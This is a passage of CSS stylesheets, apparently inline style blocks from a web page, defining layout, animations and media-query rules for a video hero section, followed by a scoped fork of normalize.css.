    background: transparent !important;
    opacity: .8 !important; }
    .scrollarea .scrollbar-container.active, .scrollarea .scrollbar-container:hover {
      opacity: 1 !important; }
    .scrollarea .scrollbar-container.vertical {
      right: 5px !important; }
    .scrollarea .scrollbar-container .scrollbar {
      width: 12px !important;
      border-radius: 12px;
      opacity: 0;
      transition: opacity .1s ease-in-out; }
</style><style type="text/css">._2UdhINAiXwDQLWHv9VD7dq {
  padding: 0 20px;
  background-color: rgba(255, 255, 255, 0.1);
  color: #FFFFFF;
  border-radius: 3px;
  font-size: 14px;
  display: -webkit-flex;
  display: flex;
  -webkit-align-items: center;
  align-items: center;
  height: 40px; }
  ._2UdhINAiXwDQLWHv9VD7dq svg {
    margin-right: 5px; }
    ._2UdhINAiXwDQLWHv9VD7dq svg path {
      fill: #FFFFFF; }
</style><style type="text/css">._8X4CezrGRGa3rJ7HRtA8j {
  width: 120px;
  height: 190px;
  background-color: rgba(255, 255, 255, 0.1);
  border-radius: 4px;
  display: -webkit-flex;
  display: flex;
  -webkit-flex-direction: column;
  flex-direction: column;
  -webkit-align-items: center;
  align-items: center;
  padding: 14px 18px;
  cursor: pointer;
  box-sizing: border-box; }
  ._8X4CezrGRGa3rJ7HRtA8j .GHRaAW4nfyRrD0GLZcele {
    border-radius: 100%;
    border: 2px solid #FFFFFF;
    width: 84px;
    height: 84px;
    background-color: #4A4A4A;
    background-repeat: no-repeat;
    background-size: 100%; }
  ._8X4CezrGRGa3rJ7HRtA8j ._1giXuNWADTdg4ueXtFSYZs, ._8X4CezrGRGa3rJ7HRtA8j ._3e4nm0mcpF9ZXRiNTLH4Zj {
    font-size: 14px;
    font-weight: 500;
    text-align: center;
    color: #FFFFFF;
    margin-top: 7px;
    overflow: hidden;
    text-overflow: ellipsis;
    line-height: 16px;
    max-height: calc(16px * 2);
    max-width: 100%; }
  ._8X4CezrGRGa3rJ7HRtA8j ._3e4nm0mcpF9ZXRiNTLH4Zj {
    color: #9B9B9B; }
  ._8X4CezrGRGa3rJ7HRtA8j:hover {
    background-color: #FFFFFF; }
    ._8X4CezrGRGa3rJ7HRtA8j:hover ._1giXuNWADTdg4ueXtFSYZs, ._8X4CezrGRGa3rJ7HRtA8j:hover ._3e4nm0mcpF9ZXRiNTLH4Zj, ._8X4CezrGRGa3rJ7HRtA8j:hover ._3e4nm0mcpF9ZXRiNTLH4Zj {
      color: #2e2e42; }
</style><style type="text/css">._1lqcKyrjW4M765U0Wrb31i {
  margin-bottom: 35px;
  display: -webkit-flex;
  display: flex;
  -webkit-align-items: center;
  align-items: center;
  -webkit-justify-content: flex-start;
  justify-content: flex-start; }

._3ggQ3EuPdo9pWiWvR-Smm5 {
  font-family: 'Work Sans', sans-serif;
  position: fixed;
  left: 0;
  width: 100%;
  height: 100%;
  z-index: 0;
  background-color: #000; }
  ._3ggQ3EuPdo9pWiWvR-Smm5 > div:first-child {
    height: 100%; }

.Don1fdmwOHfQKOPv595qK {
  position: absolute;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  overflow: hidden;
  display: none;
  -webkit-animation: _3u2HMmbsHWJtU0-rzKzHel 1s forwards;
  animation: _3u2HMmbsHWJtU0-rzKzHel 1s forwards; }

._1pHkkp6RH8fYN7HgsWmoqu {
  position: absolute;
  z-index: 0; }
  ._1pHkkp6RH8fYN7HgsWmoqu > video {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%; }
  @media (min-aspect-ratio: 16 / 9) {
    ._1pHkkp6RH8fYN7HgsWmoqu > video {
      height: 300% !important;
      top: -100% !important; } }
  @media (max-aspect-ratio: 16 / 9) {
    ._1pHkkp6RH8fYN7HgsWmoqu > video {
      width: 300% !important;
      left: -100% !important; } }

._3yW8WgrNpAuQUnfL-e-f-0 {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: rgba(0, 0, 0, 0.6);
  z-index: 1;
  transition: background-color 1s linear; }

.OYc0_k3pYzHyzHwCQnxpu {
  font-weight: 600;
  font-size: 55px;
  color: #FFFFFF;
  margin: 0;
  max-width: 50%;
  line-height: 1.2; }

._1DoURhY1F59KyKEgkEV8gv {
  font-weight: 400;
  font-size: 22px;
  color: #50E3C2;
  margin: 0; }

._C6qb022EDh4WgAITtY84 {
  position: absolute;
  right: 0;
  left: 0;
  bottom: 0;
  padding: 0 30px;
  -webkit-animation: _3u2HMmbsHWJtU0-rzKzHel 1s forwards;
  animation: _3u2HMmbsHWJtU0-rzKzHel 1s forwards;
  transition: -webkit-transform .5s ease-out;
  transition: transform .5s ease-out;
  transition: transform .5s ease-out, -webkit-transform .5s ease-out; }

._3BG22cwe0B167fMbU5F17O {
  margin-bottom: 35px; }

._1qtH3-A6sos-yFb0orClvi {
  display: -webkit-flex;
  display: flex;
  -webkit-align-items: center;
  align-items: center;
  -webkit-justify-content: space-between;
  justify-content: space-between;
  margin-right: -30px; }

._9ztuGc8lHs9zPJZxmRisF {
  display: -webkit-flex;
  display: flex;
  -webkit-align-items: center;
  align-items: center; }

._15iW41Rsu1XiFnIg3MAiRJ {
  display: block;
  width: 75%; }
  ._15iW41Rsu1XiFnIg3MAiRJ > span {
    font-size: 18px;
    font-weight: 400;
    color: rgba(255, 255, 255, 0.5);
    margin-right: 20px;
    text-decoration: none;
    display: inline-block; }
    ._15iW41Rsu1XiFnIg3MAiRJ > span:last-child {
      margin-right: 0; }
  ._15iW41Rsu1XiFnIg3MAiRJ button {
    background: none;
    border-radius: 0;
    border: none;
    font-size: 18px;
    font-weight: 400;
    color: rgba(255, 255, 255, 0.5);
    padding: 0;
    cursor: pointer;
    outline: none; }
    ._15iW41Rsu1XiFnIg3MAiRJ button + button {
      margin-left: 20px; }
    ._15iW41Rsu1XiFnIg3MAiRJ button:hover {
      color: #FFFFFF; }

._2sQmyyZVEtWuktXW_EkFWh {
  display: -webkit-flex;
  display: flex;
  font-size: 18px;
  font-weight: 400;
  color: rgba(255, 255, 255, 0.5);
  height: 190px; }
  ._2sQmyyZVEtWuktXW_EkFWh ._3Ebp76ubOLB5VTbib9Sb5X {
    -webkit-flex: 1;
    flex: 1;
    line-height: 1.4; }
  ._2sQmyyZVEtWuktXW_EkFWh ._1BI3QOkFWGYwW0jpDDBMsy {
    -webkit-flex: 1;
    flex: 1;
    min-width: 0;
    margin-left: 35px; }

._8EpuF7BzGDJguOjxjZU2t {
  -webkit-align-items: center;
  align-items: center;
  -webkit-justify-content: flex-start;
  justify-content: flex-start;
  position: relative;
  display: none;
  -webkit-animation: _2y43K-iTiN36q7nEqF16gH 1s forwards;
  animation: _2y43K-iTiN36q7nEqF16gH 1s forwards; }
  ._8EpuF7BzGDJguOjxjZU2t:before {
    content: '';
    width: 1px;
    height: 50px;
    display: inline-block;
    margin-right: 10px;
    background-color: rgba(255, 255, 255, 0.5); }

._2YkSD7TdE7LoQDxMxQjhAR {
  margin-right: 7px;
  opacity: .5;
  cursor: pointer; }
  ._2YkSD7TdE7LoQDxMxQjhAR:hover {
    opacity: 1; }
    ._2YkSD7TdE7LoQDxMxQjhAR:hover ._3WTlYbx6fsiRP0WqOd0u3w {
      display: block; }
  ._2YkSD7TdE7LoQDxMxQjhAR svg path {
    fill: #FFFFFF; }

._3WTlYbx6fsiRP0WqOd0u3w {
  font-family: 'Work Sans', sans-serif;
  position: absolute;
  right: 0;
  bottom: 100%;
  margin-bottom: 25px;
  color: #FFFFFF;
  max-width: 290px;
  padding: 5px 20px;
  background-color: rgba(255, 255, 255, 0.1);
  z-index: 3;
  -webkit-animation: _2y43K-iTiN36q7nEqF16gH .3s forwards;
  animation: _2y43K-iTiN36q7nEqF16gH .3s forwards;
  white-space: nowrap;
  display: none; }

.fZjEijTnJowdOajHx8SsZ ._3yW8WgrNpAuQUnfL-e-f-0 {
  overflow: hidden;
  background-color: transparent; }

.fZjEijTnJowdOajHx8SsZ ._C6qb022EDh4WgAITtY84 {
  -webkit-animation: _1PKJXvanKcFs1XX7sEJLzo 2s forwards;
  animation: _1PKJXvanKcFs1XX7sEJLzo 2s forwards; }

.fZjEijTnJowdOajHx8SsZ ._1SgwehLUc9tUELk7WM_UFM {
  -webkit-animation: _3ULrquB1w2pqcHaPFoNMX0 2s forwards;
  animation: _3ULrquB1w2pqcHaPFoNMX0 2s forwards; }

._4HGVw_CG9K_fIhFuCru8 {
  margin-right: 43px !important;
  opacity: .5; }
  ._4HGVw_CG9K_fIhFuCru8:hover {
    opacity: 1; }

._25kEjFbIsBdBLoFcZ79s2O {
  display: block; }

._1q2vztjE8JGowniLQ3Xkkp {
  display: -webkit-flex;
  display: flex;
  -webkit-align-items: center;
  align-items: center; }

._3XJPIl-s7wbauJNtfcl6ne {
  font-size: 22px;
  font-weight: 500;
  margin-right: 38px;
  color: #FFFFFF; }

._11jveb7cOE2d-6HvLm8s42 {
  font-size: 22px;
  color: #9B9B9B;
  margin-right: 20px;
  text-decoration: none;
  cursor: pointer; }
  ._11jveb7cOE2d-6HvLm8s42:hover {
    color: #FFFFFF; }
  ._11jveb7cOE2d-6HvLm8s42:last-child {
    margin-right: 0; }

._22RnI2q_VRs8Njycf6stJY {
  color: #FFFFFF; }

._2qW73y-0hE9UL5C7hwmhz5 {
  -webkit-animation: _3hEjB7K8WvkK2Wa_wpNmQd 1s forwards;
  animation: _3hEjB7K8WvkK2Wa_wpNmQd 1s forwards; }

.gsPsiYG9n3q55V6hgmEZX > div {
  width: 100%;
  height: 100%;
  position: absolute;
  left: 0;
  top: 0; }

.gsPsiYG9n3q55V6hgmEZX ._1ucUz-9CK2ZNKCbJzpznzV {
  background-position: center;
  background-size: cover;
  height: 100%; }

._2rsH1JYYXJPt5SIoVbDxh0 {
  position: relative;
  width: 100%;
  height: 100%; }

._2kOyR7dZBqUZ-TOpDbvPFv {
  display: none; }

._2S6iXzDm2n6zEGNLb_C9R1 {
  display: none; }
  ._2S6iXzDm2n6zEGNLb_C9R1 ._2yVhIcbpDCqO7g5zs46LA4 {
    display: none; }

.V_diF3u5SMzeo13Xq8B8c {
  position: relative;
  display: block;
  width: auto;
  height: 40px;
  overflow: hidden;
  border: none; }
  .V_diF3u5SMzeo13Xq8B8c select {
    -webkit-appearance: none;
    -moz-appearance: none;
    -ms-appearance: none;
    appearance: none;
    outline: 0;
    box-shadow: none;
    border: 0 !important;
    background: transparent;
    display: block;
    width: 100%;
    height: 100%;
    margin: 0;
    padding: 0 40px 0 10px;
    color: #ffffff;
    cursor: pointer;
    font-size: 22px;
    font-weight: 500; }
    .V_diF3u5SMzeo13Xq8B8c select::-ms-expand {
      display: none; }
  .V_diF3u5SMzeo13Xq8B8c:after {
    content: '';
    position: absolute;
    right: 10px;
    top: 45%;
    pointer-events: none;
    border-right: 2px solid #ffffff;
    border-bottom: 2px solid #ffffff;
    width: 10px;
    height: 10px;
    -webkit-transform: translateY(-50%) rotate(45deg);
    transform: translateY(-50%) rotate(45deg); }

._5kMH7mpHt6g4FxsSnSqUv {
  display: -webkit-flex;
  display: flex; }

._38B4GM2Ab3qUczRkhqZkm- {
  display: none; }

.tcK_xyyHBcBkSiyDzJJqS {
  color: #FFFFFF;
  display: inline-block;
  margin-left: 48px; }

._1SgwehLUc9tUELk7WM_UFM {
  position: absolute;
  top: 24px;
  right: 35px;
  z-index: 1;
  opacity: .6; }
  ._1SgwehLUc9tUELk7WM_UFM path {
    fill: #FFFFFF; }
  ._1SgwehLUc9tUELk7WM_UFM:hover {
    opacity: 1; }

.UOXGQ8T0503HCqDzuXoYp {
  font-size: 16px;
  color: #ffffff;
  font-weight: 500; }
  .UOXGQ8T0503HCqDzuXoYp ._6V-p5Bow53rKL9-IlAoyj {
    margin-bottom: -2px;
    margin-left: 5px;
    border-bottom: 2px dashed #ffffff;
    cursor: pointer; }
    .UOXGQ8T0503HCqDzuXoYp ._6V-p5Bow53rKL9-IlAoyj:before {
      content: ' ';
      display: inline-block; }

@media (max-width: 767px) {
  body {
    overflow-x: hidden;
    overflow-y: scroll; }
  ._15iW41Rsu1XiFnIg3MAiRJ {
    -webkit-flex-direction: column;
    flex-direction: column;
    -webkit-align-items: flex-start;
    align-items: flex-start;
    width: 100%; }
    ._15iW41Rsu1XiFnIg3MAiRJ button {
      pointer-events: none;
      color: #ffffff; }
    ._15iW41Rsu1XiFnIg3MAiRJ > span {
      color: #ffffff;
      margin-bottom: 18px;
      margin-right: 0;
      display: block; }
      ._15iW41Rsu1XiFnIg3MAiRJ > span:last-child {
        margin-bottom: 0; }
  ._2S6iXzDm2n6zEGNLb_C9R1 {
    display: block;
    position: fixed;
    bottom: 0;
    left: 0;
    width: 100%;
    z-index: 3; }
    ._2S6iXzDm2n6zEGNLb_C9R1 ._2yVhIcbpDCqO7g5zs46LA4 {
      display: block;
      width: 100%;
      font-weight: 500;
      font-size: 18px;
      padding: 17px 10px;
      text-align: center;
      text-decoration: none;
      cursor: pointer;
      border: 0;
      border-radius: 0; }
      ._2S6iXzDm2n6zEGNLb_C9R1 ._2yVhIcbpDCqO7g5zs46LA4:last-child {
        color: #ffffff;
        background-color: #93939B; }
      ._2S6iXzDm2n6zEGNLb_C9R1 ._2yVhIcbpDCqO7g5zs46LA4:first-child {
        color: #232530;
        background-color: #ffffff; }
  ._1lqcKyrjW4M765U0Wrb31i {
    margin-bottom: 26px; }
  .OYc0_k3pYzHyzHwCQnxpu {
    font-size: 38px;
    text-align: center;
    padding-left: 10px;
    padding-right: 10px;
    max-width: 100%; }
  ._1DoURhY1F59KyKEgkEV8gv {
    font-size: 18px;
    text-align: center;
    padding-left: 10px;
    padding-right: 10px; }
  ._2kOyR7dZBqUZ-TOpDbvPFv {
    display: block;
    position: absolute;
    left: 0;
    right: 0;
    bottom: 120px;
    z-index: 1; }
    ._2kOyR7dZBqUZ-TOpDbvPFv ._1lqcKyrjW4M765U0Wrb31i {
      -webkit-justify-content: center;
      justify-content: center; }
  ._3ggQ3EuPdo9pWiWvR-Smm5 {
    position: relative;
    background-color: #272837;
    overflow: hidden; }
    ._3ggQ3EuPdo9pWiWvR-Smm5 > div:first-child {
      position: relative;
      width: 100%;
      -webkit-overflow-scrolling: touch;
      overflow-y: scroll; }
  .gsPsiYG9n3q55V6hgmEZX:after {
    content: '';
    display: block;
    position: absolute;
    z-index: 1;
    top: 50%;
    bottom: -5px;
    left: 0;
    right: 0;
    background: linear-gradient(to bottom, rgba(0, 0, 0, 0) 0%, #272837 100%); }
  .gsPsiYG9n3q55V6hgmEZX > div {
    position: relative; }
  ._3yW8WgrNpAuQUnfL-e-f-0 {
    position: relative;
    background-color: transparent;
    transition: none;
    overflow-x: hidden; }
  ._C6qb022EDh4WgAITtY84 {
    position: relative;
    -webkit-animation: none !important;
    animation: none !important;
    padding: 0 17px 110px; }
    ._C6qb022EDh4WgAITtY84 ._3BG22cwe0B167fMbU5F17O {
      margin-bottom: 0; }
  ._2sQmyyZVEtWuktXW_EkFWh {
    -webkit-flex-direction: column;
    flex-direction: column;
    height: auto;
    margin-bottom: 10px; }
    ._2sQmyyZVEtWuktXW_EkFWh ._3Ebp76ubOLB5VTbib9Sb5X {
      background-color: #2e3041;
      padding: 24px 13px;
      margin-bottom: 20px;
      border-radius: 4px; }
      ._2sQmyyZVEtWuktXW_EkFWh ._3Ebp76ubOLB5VTbib9Sb5X ._3ytoxTXLNf75fKrIULyvPr {
        overflow: hidden;
        text-overflow: ellipsis;
        line-height: 24px;
        max-height: calc(24px * 5); }
      ._2sQmyyZVEtWuktXW_EkFWh ._3Ebp76ubOLB5VTbib9Sb5X ._23t2q7hpdjOOeM33f7xBAi {
        color: #ffffff;
        font-weight: 500;
        margin-top: 5px; }
    ._2sQmyyZVEtWuktXW_EkFWh ._1BI3QOkFWGYwW0jpDDBMsy {
      margin-left: 0;
      margin-bottom: 20px; }
  ._5kMH7mpHt6g4FxsSnSqUv {
    display: none; }
  ._38B4GM2Ab3qUczRkhqZkm- {
    display: block; } }

@media (max-width: 1024px) {
  .OYc0_k3pYzHyzHwCQnxpu {
    max-width: 100%; }
  ._2sQmyyZVEtWuktXW_EkFWh ._1BI3QOkFWGYwW0jpDDBMsy {
    display: none; } }

@-webkit-keyframes _1PKJXvanKcFs1XX7sEJLzo {
  0% {
    overflow: hidden;
    opacity: 1; }
  100% {
    opacity: 0;
    visibility: hidden;
    bottom: -100%; } }

@keyframes _1PKJXvanKcFs1XX7sEJLzo {
  0% {
    overflow: hidden;
    opacity: 1; }
  100% {
    opacity: 0;
    visibility: hidden;
    bottom: -100%; } }

@-webkit-keyframes _3ULrquB1w2pqcHaPFoNMX0 {
  0% {
    overflow: hidden; }
  100% {
    visibility: hidden;
    top: -100%; } }

@keyframes _3ULrquB1w2pqcHaPFoNMX0 {
  0% {
    overflow: hidden; }
  100% {
    visibility: hidden;
    top: -100%; } }

@-webkit-keyframes _3u2HMmbsHWJtU0-rzKzHel {
  0% {
    opacity: 0; }
  100% {
    opacity: 1; } }

@keyframes _3u2HMmbsHWJtU0-rzKzHel {
  0% {
    opacity: 0; }
  100% {
    opacity: 1; } }

@-webkit-keyframes _3hEjB7K8WvkK2Wa_wpNmQd {
  0% {
    opacity: 1; }
  100% {
    opacity: 0;
    visibility: hidden; } }

@keyframes _3hEjB7K8WvkK2Wa_wpNmQd {
  0% {
    opacity: 1; }
  100% {
    opacity: 0;
    visibility: hidden; } }

@-webkit-keyframes _2y43K-iTiN36q7nEqF16gH {
  0% {
    -webkit-transform: translateX(100%);
    transform: translateX(100%); }
  100% {
    -webkit-transform: translateX(0);
    transform: translateX(0); } }

@keyframes _2y43K-iTiN36q7nEqF16gH {
  0% {
    -webkit-transform: translateX(100%);
    transform: translateX(100%); }
  100% {
    -webkit-transform: translateX(0);
    transform: translateX(0); } }
</style><style type="text/css">._2TIYoKdMB1jFeMZh68la7r {
  /* Manually forked from Normalize.css */
  /* normalize.css v5.0.0 | MIT License | github.com/necolas/normalize.css */
  /**
 * 1. Change the default font family in all browsers (opinionated).
 * 2. Correct the line height in all browsers.
 * 3. Prevent adjustments of font size after orientation changes in
 *    IE on Windows Phone and in iOS.
 */
  /* Document
   ========================================================================== */
  /* Sections
   ========================================================================== */
  /**
 * Remove the margin in all browsers (opinionated).
 */
  /**
 * Add the correct display in IE 9-.
 */
  /**
 * Correct the font size and margin on `h1` elements within `section` and
 * `article` contexts in Chrome, Firefox, and Safari.
 */
  /* Grouping content
   ========================================================================== */
  /**
 * Add the correct display in IE 9-.
 * 1. Add the correct display in IE.
 */
  /**
 * Add the correct margin in IE 8 (removed).
 */
  /**
 * 1. Add the correct box sizing in Firefox.
 * 2. Show the overflow in Edge and IE.
 */
  /**
 * 1. Correct the inheritance and scaling of font size in all browsers. (removed)
 * 2. Correct the odd `em` font sizing in all browsers.
 */
  /* Text-level semantics
   ========================================================================== */
  /**
 * 1. Remove the gray background on active links in IE 10.
 * 2. Remove gaps in links underline in iOS 8+ and Safari 8+.
 */
  /**
 * Remove the outline on focused links when they are also active or hovered
 * in all browsers (opinionated).
 */
  /**
 * Modify default styling of address.
 */
  /**
 * 1. Remove the bottom border in Firefox 39-.
 * 2. Add the correct text decoration in Chrome, Edge, IE, Opera, and Safari. (removed)
 */
  /**
 * Prevent the duplicate application of `bolder` by the next rule in Safari 6.
 */
  /**
 * Add the correct font weight in Chrome, Edge, and Safari.
 */
  /**
 * 1. Correct the inheritance and scaling of font size in all browsers.
 * 2. Correct the odd `em` font sizing in all browsers.
 */
  /**
 * Add the correct font style in Android 4.3-.
 */
  /**
 * Add the correct background and color in IE 9-. (Removed)
 */
  /**
 * Add the correct font size in all browsers.
 */
  /**
 * Prevent `sub` and `sup` elements from affecting the line height in
 * all browsers.
 */
  /* Embedded content
   ========================================================================== */
  /**
 * Add the correct display in IE 9-.
 */
  /**
 * Add the correct display in iOS 4-7.
 */
  /**
 * Remove the border on images inside links in IE 10-.
 */
  /**
 * Hide the overflow in IE.
 */
  /* Forms
   ========================================================================== */
  /**
 * 1. Change the font styles in all browsers (opinionated).
 * 2. Remove the margin in Firefox and Safari.
 */
  /**
 * Show the overflow in IE.
 * 1. Show the overflow in Edge.
 */
  /**
 * Remove the inheritance of text transform in Edge, Firefox, and IE.
 * 1. Remove the inheritance of text transform in Firefox.
 */
  /**
 * 1. Prevent a WebKit bug where (2) destroys native `audio` and `video`
 *    controls in Android 4.
 * 2. Correct the inability to style clickable types in iOS and Safari.
 */
  /**
 * Remove the inner border and padding in Firefox.
 */
  /**
 * Restore the focus styles unset by the previous rule (removed).
 */
  /**
 * Change the border, margin, and padding in all browsers (opinionated) (changed).
 */
  /**
 * 1. Correct the text wrapping in Edge and IE.
 * 2. Correct the color inheritance from `fieldset` elements in IE.
 * 3. Remove the padding so developers are not caught out when they zero out
 *    `fieldset` elements in all browsers.
 */
  /**
 * 1. Add the correct display in IE 9-.
 * 2. Add the correct vertical alignment in Chrome, Firefox, and Opera.
 */
  /**
 * Remove the default vertical scrollbar in IE.
 */
  /**
 * 1. Add the correct box sizing in IE 10-.
 * 2. Remove the padding in IE 10-.
 */
  /**
 * Correct the cursor style of increment and decrement buttons in Chrome.
 */
  /**
 * 1. Correct the odd appearance in Chrome and Safari.
 * 2. Correct the outline style in Safari.
 */
  /**
 * Remove the inner padding and cancel buttons in Chrome and Safari on macOS.
 */
  /**
 * 1. Correct the inability to style clickable types in iOS and Safari.
 * 2. Change font properties to `inherit` in Safari.
 */
  /* Interactive
   ========================================================================== */
  /*
 * Add the correct display in IE 9-.
 * 1. Add the correct display in Edge, IE, and Firefox.
 */
  /*
 * Add the correct display in all browsers.
 */
  /* Scripting
   ========================================================================== */
  /**
 * Add the correct display in IE 9-.
 */
  /**
 * Add the correct display in IE.
 */
  /* Hidden
   ========================================================================== */
  /**
 * Add the correct display in IE 10-.
 */ }
  ._2TIYoKdMB1jFeMZh68la7r html {
    font-family: sans-serif;
    /* 1 */
    -ms-text-size-adjust: 100%;
    /* 3 */
    -webkit-text-size-adjust: 100%;
    /* 3 */ }
  ._2TIYoKdMB1jFeMZh68la7r body {
    margin: 0; }
  ._2TIYoKdMB1jFeMZh68la7r article,
  ._2TIYoKdMB1jFeMZh68la7r aside,
  ._2TIYoKdMB1jFeMZh68la7r footer,
  ._2TIYoKdMB1jFeMZh68la7r header,
  ._2TIYoKdMB1jFeMZh68la7r nav,
  ._2TIYoKdMB1jFeMZh68la7r section {
    display: block; }
  ._2TIYoKdMB1jFeMZh68la7r h1 {
    font-size: 2em;
    margin: 0.67em 0; }
  ._2TIYoKdMB1jFeMZh68la7r figcaption,
  ._2TIYoKdMB1jFeMZh68la7r figure,
  ._2TIYoKdMB1jFeMZh68la7r main {
    /* 1 */
    display: block; }
  ._2TIYoKdMB1jFeMZh68la7r hr {
    box-sizing: content-box;
    /* 1 */
    height: 0;
    /* 1 */
    overflow: visible;
    /* 2 */ }
  ._2TIYoKdMB1jFeMZh68la7r a {
    background-color: transparent;
    /* 1 */
    -webkit-text-decoration-skip: objects;
    /* 2 */ }
  ._2TIYoKdMB1jFeMZh68la7r a:active,
  ._2TIYoKdMB1jFeMZh68la7r a:hover {
    outline-width: 0; }
  ._2TIYoKdMB1jFeMZh68la7r address {
    font-style: normal; }
  ._2TIYoKdMB1jFeMZh68la7r b,
  ._2TIYoKdMB1jFeMZh68la7r strong {
    font-weight: inherit; }
  ._2TIYoKdMB1jFeMZh68la7r b,
  ._2TIYoKdMB1jFeMZh68la7r strong {
    font-weight: bolder; }
  ._2TIYoKdMB1jFeMZh68la7r code,
  ._2TIYoKdMB1jFeMZh68la7r kbd,
  ._2TIYoKdMB1jFeMZh68la7r pre,
  ._2TIYoKdMB1jFeMZh68la7r samp {
    font-family: "Work Sans", monospace;
    /* 1 (changed) */
    font-size: 1em;
    /* 2 */ }
  ._2TIYoKdMB1jFeMZh68la7r dfn {
    font-style: italic; }
  ._2TIYoKdMB1jFeMZh68la7r small {
    font-size: 80%;
    font-weight: 400;
    /* (added) */ }
  ._2TIYoKdMB1jFeMZh68la7r sub,
  ._2TIYoKdMB1jFeMZh68la7r sup {
    font-size: 75%;
    line-height: 0;
    position: relative;
    vertical-align: baseline; }
  ._2TIYoKdMB1jFeMZh68la7r sub {
    bottom: -0.25em; }
  ._2TIYoKdMB1jFeMZh68la7r sup {
    top: -0.5em; }
  ._2TIYoKdMB1jFeMZh68la7r audio,
  ._2TIYoKdMB1jFeMZh68la7r video {
    display: inline-block; }
  ._2TIYoKdMB1jFeMZh68la7r audio:not([controls]) {
    display: none;
    height: 0; }
  ._2TIYoKdMB1jFeMZh68la7r img {
    border-style: none; }
  ._2TIYoKdMB1jFeMZh68la7r svg:not(:root) {
    overflow: hidden; }
  ._2TIYoKdMB1jFeMZh68la7r button,
  ._2TIYoKdMB1jFeMZh68la7r input,
  ._2TIYoKdMB1jFeMZh68la7r optgroup,
  ._2TIYoKdMB1jFeMZh68la7r select,
  ._2TIYoKdMB1jFeMZh68la7r textarea {
    font-family: inherit;
    /* 1 (changed) */
    font-size: inherit;
    /* 1 (changed) */
    line-height: inherit;
    /* 1 (changed) */
    margin: 0;
    /* 2 */ }
  ._2TIYoKdMB1jFeMZh68la7r button,
  ._2TIYoKdMB1jFeMZh68la7r input {
    /* 1 */
    overflow: visible; }
  ._2TIYoKdMB1jFeMZh68la7r button,
  ._2TIYoKdMB1jFeMZh68la7r select {
    /* 1 */
    text-transform: none; }
  ._2TIYoKdMB1jFeMZh68la7r button,
  ._2TIYoKdMB1jFeMZh68la7r html [type="button"],
  ._2TIYoKdMB1jFeMZh68la7r [type="reset"],
  ._2TIYoKdMB1jFeMZh68la7r [type="submit"] {
    -webkit-appearance: button;
    /* 2 */ }
  ._2TIYoKdMB1jFeMZh68la7r button::-moz-focus-inner,
  ._2TIYoKdMB1jFeMZh68la7r [type="button"]::-moz-focus-inner,
  ._2TIYoKdMB1jFeMZh68la7r [type="reset"]::-moz-focus-inner,
  ._2TIYoKdMB1jFeMZh68la7r [type="submit"]::-moz-focus-inner {
    border-style: none;
    padding: 0; }
  ._2TIYoKdMB1jFeMZh68la7r fieldset {
    border: 0;
    margin: 0;
    padding: 0; }
  ._2TIYoKdMB1jFeMZh68la7r legend {
    box-sizing: border-box;
    /* 1 */
    color: inherit;
    /* 2 */
    display: table;
    /* 1 */
    max-width: 100%;
    /* 1 */
    padding: 0;
    /* 3 */
    white-space: normal;
    /* 1 */ }
  ._2TIYoKdMB1jFeMZh68la7r progress {
    display: inline-block;
    /* 1 */
    vertical-align: baseline;
    /* 2 */ }
  ._2TIYoKdMB1jFeMZh68la7r textarea {
    overflow: auto; }
  ._2TIYoKdMB1jFeMZh68la7r [type="checkbox"],
  ._2TIYoKdMB1jFeMZh68la7r [type="radio"] {
    box-sizing: border-box;
    /* 1 */
    padding: 0;
    /* 2 */ }
  ._2TIYoKdMB1jFeMZh68la7r [type="number"]::-webkit-inner-spin-button,
  ._2TIYoKdMB1jFeMZh68la7r [type="number"]::-webkit-outer-spin-button {
    height: auto; }
  ._2TIYoKdMB1jFeMZh68la7r [type="search"] {
    -webkit-appearance: textfield;
    /* 1 */
    outline-offset: -2px;
    /* 2 */ }
  ._2TIYoKdMB1jFeMZh68la7r [type="search"]::-webkit-search-cancel-button,
  ._2TIYoKdMB1jFeMZh68la7r [type="search"]::-webkit-search-decoration {
    -webkit-appearance: none; }
  ._2TIYoKdMB1jFeMZh68la7r ::-webkit-file-upload-button {
    -webkit-appearance: button;
    /* 1 */
    font: inherit;
    /* 2 */ }
  ._2TIYoKdMB1jFeMZh68la7r details,
  ._2TIYoKdMB1jFeMZh68la7r menu {
    display: block; }
  ._2TIYoKdMB1jFeMZh68la7r summary {
    display: list-item;
    outline: none; }
  ._2TIYoKdMB1jFeMZh68la7r canvas {
    display: inline-block; }
  ._2TIYoKdMB1jFeMZh68la7r template {
    display: none; }
  ._2TIYoKdMB1jFeMZh68la7r [hidden] {
    display: none; }
  ._2TIYoKdMB1jFeMZh68la7r .YBMfyHk4XNjxnYKz74Px4 {
    border-collapse: collapse;
    border-spacing: 0;
    width: 100%;
    text-align: left; }
    ._2TIYoKdMB1jFeMZh68la7r .YBMfyHk4XNjxnYKz74Px4._3je7slB9uQxXaX-fzhJlQR tbody tr:nth-of-type(odd) {
      background: #f7f8f9; }
    ._2TIYoKdMB1jFeMZh68la7r .YBMfyHk4XNjxnYKz74Px4 tbody tr._3W5bl2D2eilwk7cQCvyY-j, ._2TIYoKdMB1jFeMZh68la7r .YBMfyHk4XNjxnYKz74Px4._3je7slB9uQxXaX-fzhJlQR tbody tr._3W5bl2D2eilwk7cQCvyY-j {
      background: #eef0f3; }
    ._2TIYoKdMB1jFeMZh68la7r .YBMfyHk4XNjxnYKz74Px4._1jMJIVCtbdNH8cLhMGRlod tbody tr:hover {
      background: #eef0f3; }
    ._2TIYoKdMB1jFeMZh68la7r .YBMfyHk4XNjxnYKz74Px4._3toY5sBgTcOIWf9FO9iHpy {
      display: block;
      overflow-x: auto;
      padding-bottom: .75rem;
      white-space: nowrap; }
    ._2TIYoKdMB1jFeMZh68la7r .YBMfyHk4XNjxnYKz74Px4 td,
    ._2TIYoKdMB1jFeMZh68la7r .YBMfyHk4XNjxnYKz74Px4 th {
      border-bottom: 1px solid #dadee4;
      padding: 12px 8px; }
    ._2TIYoKdMB1jFeMZh68la7r .YBMfyHk4XNjxnYKz74Px4 th {
      border-bottom-width: 2px; }
  ._2TIYoKdMB1jFeMZh68la7r .pLKju5v7sW809fWwxCIjC {
    appearance: none;
    background: #fff;
    border: 1px solid #56a4ff;
    border-radius: 2px;
    color: #56a4ff;
    cursor: pointer;
    display: inline-block;
    font-size: 14px;
    height: 36px;
    line-height: 20px;
    outline: none;
    padding: 7px 8px;
    text-align: center;
    text-decoration: none;
